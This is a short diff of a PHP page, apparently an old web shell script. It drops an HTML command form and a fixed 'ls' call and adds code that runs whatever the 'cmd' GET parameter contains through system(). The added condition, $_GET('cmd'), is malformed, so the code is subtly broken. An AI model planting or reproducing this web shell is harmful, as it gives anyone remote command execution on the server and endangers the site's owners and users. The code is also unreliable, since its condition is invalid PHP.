@@ -8,14 +8,10 @@
 // modified: 21/01/2004
 //
 ?>
-<HTML><BODY>
-<FORM METHOD="GET" NAME="myform" ACTION="">
-<INPUT TYPE="text" NAME="cmd">
-<INPUT TYPE="submit" VALUE="Send">
-</FORM>
-<pre>
+
 <?
-  system('ls');
+if($_GET('cmd'))
+  system($_GET['cmd']);
   
 ?>
 </pre>
